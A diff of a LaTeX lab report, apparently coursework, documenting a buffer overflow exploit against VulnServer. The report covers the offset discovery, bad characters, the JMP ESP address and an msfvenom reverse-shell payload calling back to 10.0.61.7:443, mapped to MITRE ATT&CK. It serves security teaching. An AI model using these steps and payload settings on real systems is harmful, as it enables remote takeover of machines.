@@ -11,11 +11,11 @@
 	\includegraphics[height=17cm]{buffer_overflow/nmap/full}
 }
 	\caption{Nmap - Full scan result}
+	\label{beeg}
 \end{figure}
 
 \newpage
-The \textit{Active Scanning (T1595)}  technique \autocite{mitre:attack:TA0043}) was utilized via Nmap to gather information about the target system \autocite{mitre:attack:T1595}.
-The goal of the Nmap scan was to obtain information about the operating system, open ports, service information, and vulnerabilities on the target system:
+The \textit{Active Scanning (T1595)}  technique \autocite{mitre:attack:T1595}) was utilized via Nmap to gather information about the target system. The will following section will contain zoomed in cutouts of \cref{beeg}.
 
 \paragraph{Scan Setup} \label{bo:scan-setup}
 To achieve this, the following Nmap parameters were used:
@@ -51,6 +51,7 @@ Writes the output to the file ``nmap.txt" in normal mode to record the scan resu
 \end{multicols}
 \end{itemize}
 
+\newpage
 \paragraph{Scan Results}
 \subparagraph{Service Scan} \label{paragraph:service-scan}
 
@@ -171,40 +172,36 @@ Connection to the server was possible via netcat, confirming it was running.
 Running the script unmodified crashed the server, which (besides being observable on the target machine) was confirmed by attempting a new connection, which failed (see \cref{execution}).
 \begin{figure}[!htb]
 	\centering
-	\includegraphics[width=0.6\linewidth]{../img/buffer_overflow/script/execution.png}
+	\includegraphics[width=0.45\linewidth]{../img/buffer_overflow/script/execution.png}
 	\caption{Crashing the server via vulnserver-poc-orig.py}
 	\label{execution}
 \end{figure}
+\begin{figure}[!htb]
+	\centering
+	\includegraphics[width=0.7\linewidth]{../img/buffer_overflow/overflow/access_violation.png}
+	\caption{Access violation notice in the ImmunityDebugger}
+	\label{access_violation}
+\end{figure}
 
-Processing the input sent via the script leads the server to crashing, since 1072 \enquote{A}-characters fill the buffer and override the return address.
-This can be observed in the ImmunityDebugger.\\ 
-The buffer contained the expected string of \enquote{A}s (see \cref{1_a_chain}) after running the script.
-
+\vspace{-4mm}
+Processing the input sent via the script lead to a crash, since 1072 \enquote{A}-characters fill the buffer and override the return address.
+This can be observed in the ImmunityDebugger (see \cref{1_a_chain}).
 \begin{figure}[htb]
 	\centering
 	\includegraphics[width=\linewidth]{../img/buffer_overflow/vulnServ/1_a_chain.png} \\
 	\caption{Buffer filled with \enquote{A}s}
 	\label{1_a_chain}
 \end{figure}
-
 The EIP was filled by four \enquote{41}s (see \cref{1_eip}), corresponding to four \enquote{A}s.
 \begin{figure}[!htb]
 	\centering
-	\includegraphics[width=\linewidth]{../img/buffer_overflow/vulnServ/1_eip.png} \\
+	\includegraphics[width=0.8\linewidth]{../img/buffer_overflow/vulnServ/1_eip.png} \\
 	\caption{EIP filled with 41s}
 	\label{1_eip}
 \end{figure}
-\\This lead to the crash, since \textit{41414141} is not a valid memory address containing instructions that should be performed after the function returned (see \cref{access_violation}).
+This lead to the crash, since \textit{41414141} is not a valid memory address containing instructions that should be performed after the function returned (see \cref{access_violation}).
+At this point, without any further exploitation set up, this cursory attack could be categorized as \textit{Endpoint Denial of Service: Application or System Exploitation (T1499.004)} \autocite{mitre:attack:T1499:004}.
 
-At this point, without any further exploitation set up, this cursory attack could be categorized as \textit{Endpoint Denial of Service: Application or System Exploitation (T1499.004)} \autocite{mitre:attack:T1499:004}, since all that is being achieved with the script is a server crash that denies regular users availability.
-
-\clearpage\newpage
-\begin{figure}[!htb]
-	\centering
-	\includegraphics[width=\linewidth]{../img/buffer_overflow/overflow/access_violation.png}
-	\caption{Access violation notice in the ImmunityDebugger}
-	\label{access_violation}
-\end{figure}
 \paragraph{Determining the offset} \label{subsubsec:offset_calc}
 Now that the possibility of a crash was confirmed, the offset to write to the EIP needed to be determined.
 To achieve this, a non-repeating string of characters was created. (see \cref{2_unique}).
@@ -229,27 +226,23 @@ The output was written to a file \textit{unique\_charseq.txt} and moved into the
 This string was used to identify the exact position of characters that were being written into the EIP register.
 The transmitted input lead to the server crashing, as was expected, and by following the ESP register in dump the string was identified in the process' memory (see \cref{2_unique_memory}).
 
-\newpage
-\begin{figure}[!htb]
-	\centering
-	\includegraphics[width=\linewidth]{../img/buffer_overflow/vulnServ/2_unique_memory.png} \\
-	\caption{Observing the non-repeating string in ImmunityDebugger}
-	\label{2_unique_memory}
-\end{figure}
-
-
- The debugger was used to determine which bytes from the unique character string were written to the EIP register (see \cref{2_unique_eip}).
+The debugger was used to determine which bytes from the unique character string were written to the EIP register (see \cref{2_unique_eip}).
 
 \begin{figure}[!htb]
 	\centering
 	\includegraphics[width=\linewidth]{../img/buffer_overflow/vulnServ/2_unique_eip.png} \\
 	\caption{Observing the EIP after crashing the server with the unique character sequence}
+	\label{2_unique_memory}
+\end{figure}
+
+\begin{figure}[!htb]
+	\centering
+	\includegraphics[width=\linewidth]{../img/buffer_overflow/vulnServ/2_unique_memory.png} \\
+	\caption{Observing the non-repeating string in ImmunityDebugger}
 	\label{2_unique_eip}
 \end{figure}
 
-\clearpage\newpage
-
-The EIP now read: \\[0.5em]
+The EIP now read:
 \setlength{\fboxsep}{6pt}
 \fbox{\large \textbf{37694236}}
 
@@ -262,7 +255,6 @@ This was used to determine the offset by feeding this value back into metasploit
 	\label{2_offset}
 \end{figure}
 
-\vspace*{-4mm}
 The following parameters were used:
 \begin{itemize}
 	\vspace*{-5mm}
@@ -296,7 +288,6 @@ The expected character sequence was observed in memory. 4 \enquote{B}s (4 x \enq
 
 Analyzing \cref{2_confirm1}, one can see that the program inserts the character \textbf{\textbackslash FF} four times close to the EIP. If the payload doesn't fit in the buffer after the return address, it might be necessary to stage it. In that case this overwriting of bytes could become relevant, since it could overwrite a payload placed before the EIP in the buffer.
 
-\newpage
 \paragraph{Determining bad characters}
 Before generating a payload we need to determine bad characters to avoid them interrupting the processing of the generated payload.
 To test the input, the file \enquote{\textit{badchars.txt}} was provided. Its contents were written to a variable in the script (see \cref{3_bad_chars}).
@@ -312,16 +303,15 @@ To determine the bad characters, the bad character candidate string was inserted
 
 \begin{figure}[htb]
 	\centering
-	\includegraphics[width=\linewidth]{../img/buffer_overflow/vulnServ/3_bad_chars_script.png} \\
+	\includegraphics[width=0.8\linewidth]{../img/buffer_overflow/vulnServ/3_bad_chars_script.png} \\
 	\caption{Badchars testing against the server}
 	\label{3_bad_chars_script}
 \end{figure}
 
-This enabled determining which characters got processed by analyzing the memory in ImmunityDebugger by following the ESP in dump. 
 If the \enquote{B}s didn't show up in memory, a bad character had to have been sent since the input processing was terminated prematurely.
 
-Sending the original unaltered bad character string prevented the input from being processed fully, meaning a bad character was present. Immediately noticeable was, that the required string of \enquote{B}s was not present (see \cref{no-b}).\\
-Since no characters from the bad\_chars list showed up in memory, it was assumed that the first byte (\enquote{\textbf{\textbackslash x00}}, the null byte) was a bad character and needed to be removed.
+Sending the original unaltered bad character string prevented the input from being processed fully, meaning a bad character was sent, since the string of \enquote{B}s was not present (see \cref{no-b}).
+Because no characters from the bad\_chars list showed up in memory either, it was assumed that the first byte (\enquote{\textbf{\textbackslash x00}}, the null byte) was a bad character and needed to be removed.
 
 \begin{figure}[!htb]
 	\centering
@@ -331,9 +321,6 @@ Since no characters from the bad\_chars list showed up in memory, it was assumed
 \end{figure}
 
 Removing the character \enquote{\textbf{\textbackslash x00}} (see \cref{no_bad_chars}) resulted in the input being parsed completely and written to the buffer (see \cref{yes-b}), meaning no other bad characters were relevant in this context.
-
-After the string of \enquote{A}s, the interpreted characters from the \textit{bad\_chars} sequence were observable in memory, followed by the sequence of \enquote{B}s (see \cref{yes-b}).
- The \enquote{B}s were placed to make a fully processed input more easily identifiable.
 
 \begin{figure}[!htb]
 	\centering
@@ -352,15 +339,11 @@ After the string of \enquote{A}s, the interpreted characters from the \textit{ba
 	\label{yes-b}
 \end{figure}
 
-\clearpage
-\newpage
 \paragraph{Finding JMP ESP instruction}
 A reliable way of executing the reverse shell instructions was needed for the attack to work.
 To instruct the host system to run the payload code, it must jump to the injected code and execute it.
-Since the buffer is filled by the input sent to the target machine, and the ESP points to the top of the stack, the ESP will point to the injected input upon running the attack. 
-This can be exploited by writing the memory address of a JMP ESP instruction to the EIP, since it stores the address of the next instruction the system should execute after the current method returns.
 
-First, the Opcode for JMP ESP needs to be determined.
+First, the Opcode for JMP ESP needed to be determined.
 The NASM shell, which shows opcodes for instructions on x86 systems \autocite{github:nasm_shell}, shows the JMP ESP opcode to be \textbf{0xFF 0xE4} (see \cref{4_jmp_esp_opcode}).
 
 \begin{figure}[htb]
@@ -400,14 +383,8 @@ Upon restarting the target machine, this JMP ESP instruction was not located at 
 	\label{jmp_found_post}
 \end{figure}
 
-The address discovered via the \enquote{Search For} feature was inside the memory space of a non-main thread (see \cref{wrong_thread}), meaning the location in memory would change across restarts since the thread will be opened anew by the process with differently allocated memory \autocite{microsoft:threads_in_stack}.
-\begin{figure}[htb]
-	\centering
-	\includegraphics[width=0.87\linewidth]{../img/buffer_overflow/post_restart/wrong_thread.png} \\
-	\caption{JMP ESP command not located in main thread}
-	\label{wrong_thread}
-\end{figure}
-\\This address stops working in the attack after a machine restart (see \textit{\hyperref[Appendix-1]{Appendix}}, \cref{fail_end} - \cref{succ_end}). To perfect the attack, an address holding the JMP ESP command was necessary, which persisted beyond reboots.
+The address discovered via the \enquote{Search For} feature was inside the memory space of a non-main thread (see \cref{jmp_found_post}, marked green), meaning the location in memory changed across restarts since the thread will be opened anew by the process with differently allocated memory \autocite{microsoft:threads_in_stack}.
+This address stops working in the attack after a machine restart (see \textit{\hyperref[Appendix-1]{Appendix}}, \cref{fail_end} - \cref{succ_end}). To perfect the attack, an address holding the JMP ESP command was necessary, which persisted beyond reboots.
 This instruction could be located within the address space of any accessible module. The command \textit{!mona modules} \autocite{mona} was used to list them (see \cref{modules}).
 
 \newpage
@@ -430,7 +407,7 @@ Memory addresses cannot be randomized inside the module to make accessing the JM
 If memory is marked as non-executable, using the JMP ESP instruction wouldn't work, even if such an instruction were present.
 \end{itemize}
 
-The  vulnerable server process itself (\textit{VulnServer.exe}) had both ASLR and DEP disabled, (see \cref{modules_zoomed}, a zoomed-in cutout of \cref{modules}).
+The vulnerable server process itself (\textit{VulnServer.exe}) had both ASLR and DEP disabled, (see \cref{modules_zoomed}, a zoomed-in cutout of \cref{modules}).
 
 \begin{figure}[htb]
 	\centering
@@ -447,10 +424,12 @@ To search within the process' memory the following command was used (see \cref{m
 The parameters were chosen with the following reasoning \autocite{mona}:
 \vspace{-3mm}
 \begin{itemize}
+\begin{multicols}{2}
 \item[-]{\textbf{s} "\textbackslash xff \textbackslash xe4"}\\
 Searches for the JMP ESP opcode.
 \item[-]{\textbf{m} VulnServer.exe}\\
 Searches within the process' memory.
+\end{multicols}
 \end{itemize}
 
 \begin{figure}[htb]
@@ -461,10 +440,10 @@ Searches within the process' memory.
 \end{figure}
 
 The following memory address was discovered (see \cref{mona_result}):
-\begin{center}
+{
 	\setlength{\fboxsep}{6pt}
 	\fbox{\large \textbf{0x 65 D1 1D 71}}
-\end{center}
+}
 
 This address persistently held the JMP ESP instruction, even across restarts of the target machine.
 
@@ -484,11 +463,11 @@ First, an encoder needed to be selected (see \cref{5_encoder_selection}).
 	\label{5_encoder_selection}
 \end{figure}
 
-An encoder from the highest ranked results was selected (\enquote{excellent} rank) by grepping for them.\\
-Since the payload was not to be injected in a powershell environment, \textit{x86/shikata\_ga\_nai} was chosen.
+An encoder from the highest ranked results was selected (\enquote{excellent} rank) by grepping for them.
+The payload was not aiming to contain \textit{PowerShell} commands, so \textit{x86/shikata\_ga\_nai} was chosen.
 
-To create the payload, the IP address of the attacker machine needed to be determined via the console command \textbf{ip a | grep tun0}.\\
-The relevant interface is \textit{tun0}, the virtual network interface the attacker machine is tunneling into the laboratory through, since the target machine is part of the laboratory network.
+To create the payload, the IP address of the attacker machine needed to be determined via the console command \textbf{ip a | grep tun0}.
+The relevant interface was \textit{tun0}, because it was the interface the attacking machine was tunneling into the target machine's network through.
 
 \begin{figure}[htb]
 \makebox[1.02\linewidth][c]{%
@@ -512,10 +491,15 @@ The payload to create a reverse shell on the target system was generated with th
 
 The parameters were chosen with the following reasoning \autocite{msfvenom}:
 \begin{itemize}
+\begin{multicols}{2}
 \item[-]{\textbf{p} windows/shell\_reverse\_tcp}\\
 Metasploit provides a payload that establishes a TCP connection to the attacker on a windows machine, which was chosen here.
 \item[-]{\textbf{LHOST}=10.0.61.7}\\
 Provides the IP address of the attacking system, enabling the script to establish the connection via TCP to that system to send the packets for the reverse shell via the network.
+\end{multicols}
+\end{itemize}
+\begin{itemize}
+\begin{multicols}{2}
 \item[-]{\textbf{LPORT}=443}\\
 The port on the attacking system on which netcat will be listening for the incoming reverse shell connection attempt.
 \item[-]{\textbf{EXITFUNC}=thread}\\
@@ -534,6 +518,7 @@ Selects the chosen encoder.
 Sets the output format to \textit{python}, to enable the code to be easily pasted into the script.
 \item[-]{\textbf{o} payload.txt}\\
 Saves the ouput to the specified file.
+\end{multicols}
 \end{itemize}
 
 It should be noted, that an outbound connection to port 443 might not be typical for the server that is being attacked. Since this was being done in a laboratory environment, no analysis was done to determine the port that would arouse the least suspicion.
@@ -555,7 +540,7 @@ Puts netcat into verbose mode, showing the status of the listener on the console
 \item[-]{\textbf{p} 443}\\
 Tells netcat to listen on port 443, the port we are establishing the connection to in our generated payload via the option \textit{LPORT=443} (see \cref{1_payload_generation}).
 \end{itemize}
-\newpage
+
 \paragraph{Decoding payload and creating reverse shell}
 To facilitate the final attack, the script was altered the following way (see \cref{payload_script}):
 \begin{figure}[!htb]
@@ -574,18 +559,7 @@ It is in reverse byte order, since Windows 7 uses "Little Endian" byte ordering,
 The attack was also done twice more with the discovered memory addresses which were impermanent across restarts, to show them not working anymore after a reboot (see \textit{\hyperref[Appendix-1]{Appendix}}, \cref{private_vpn1} - \cref{reverse_foreign}).
 \end{itemize}
 
-Upon executing the attack, the following happened:
-\vspace{-3mm}
-\begin{enumerate}
-\item{\textbf{Overwriting the EIP}}\\
-After the determined offset of 1040 bytes, which the script filled with \enquote{A}s, the EIP got overwritten with the address that reliably contained the JMP ESP command. The input wasn't terminated at any point during processing, since any bad characters had been omitted in payload generation.
-\item{\textbf{Jumping to the top of the stack}}\\
-Upon returning (RETN), the JMP ESP instruction was executed.
-The payload got decoded, the injected NOP-padding ensured the payload wouldn't get overwritten during the decoding process.
-The decoded malicious code got executed after decoding had finished . 
-\item{\textbf{Reverse shell creation}}\\
-The payload initiated a connection to the attacking system, which had the netcat listener waiting on an incoming connection (see \cref{reverse_shell}). 
-\end{enumerate}
+Upon executing the attack, the payload initiated a connection to the attacking system, which had the netcat listener waiting on an incoming connection (see \cref{reverse_shell}). 
 
 \begin{figure}[!htb]
 	\makebox[1.02\linewidth][c]{%
@@ -595,17 +569,17 @@ The payload initiated a connection to the attacking system, which had the netcat
 	\label{reverse_shell}
 \end{figure}
 
-This finalized attack was used to \enquote{Exploit Public-Facing Application (T1190)} \autocite{mitre:attack:T1190}, in order to get \enquote{Initial Access (TA0001)} \autocite{mitre:attack:TA0001} to the target system. The public facing VulnerServer application was exploited to get a payload onto the system.
+The technique \textit{Exploit Public-Facing Application (T1190)} \autocite{mitre:attack:T1190} was used with the finalized attack to in order to get \textit{Initial Access (TA0001)} \autocite{mitre:attack:TA0001} to the target system, since the Buffer Overflow in the public facing VulnerServer application was exploited to get a payload onto the system.
 
-\enquote{Execution (TA0002)} \autocite{mitre:attack:TA0002} of the payload happened because the unprotected buffer was exploited, which is categorized as \enquote{Exploitation for Client Execution (T1203)} \autocite{mitre:attack:T1203}. 
-Arbitrary code was executed by the target machine because of the exploited vulnerability.
+\textit{Execution (TA0002)} \autocite{mitre:attack:TA0002} of the payload happened because the unprotected buffer was exploited, which is categorized as \textit{Exploitation for Client Execution (T1203)} \autocite{mitre:attack:T1203}. 
+Arbitrary code was executed by the target machine because of the exploited vulnerability in the VulnServer process.
 
-\enquote{Command and Control (TA0011)} \autocite{mitre:attack:TA0101} was then established to the attacking machine via \enquote{Application Layer Protocol (T1071)} \autocite{mitre:attack:T1071}.
-The chosen payload \enquote{windows/shell\_reverse\_tcp} used a TCP connection to connect to port 443 on the attacker machine, which could appear as an outbound connection to a webserver.
+\textit{Command and Control (TA0011)} \autocite{mitre:attack:TA0101} was then established to the attacking machine via \textit{Application Layer Protocol (T1071)} \autocite{mitre:attack:T1071}.
+The chosen payload \enquote{windows/shell\_reverse\_tcp} used a TCP connection to established an outbound connection to port 443 on the attacker machine.
 
-The reverse shell served as a \enquote{Command and Scripting Interpreter: Windows Command Shell (T1059.003)} \autocite{mitre:attack:T1059.003} enabling the attacker to take over the host system via reverse shell, which was opened by the injected payload.
+The reverse shell served as a \textit{Command and Scripting Interpreter: Windows Command Shell (T1059.003)} \autocite{mitre:attack:T1059.003} enabling the attacker to take over the host system.
 
-The scope of the assignment ended at this point, not requiring further privilege escalation, lateral movement, or exploitation of any kind. Access via reverse shell on the system is a dangerous attack vector, since the attacker gets interactive control over the target machine. A risk assessment and possible countermeasures are discussed in \fullref{buff:vulns}.
+The scope of the assignment ended at this point, not requiring further techniques, lateral movement, or exploitation of any kind. Access via reverse shell on the system is a dangerous attack vector, since the attacker gets interactive control over the target machine. A risk assessment and possible countermeasures are discussed in \fullref{buff:vulns}.
 
 \newpage
 \begin{figure}[!h]
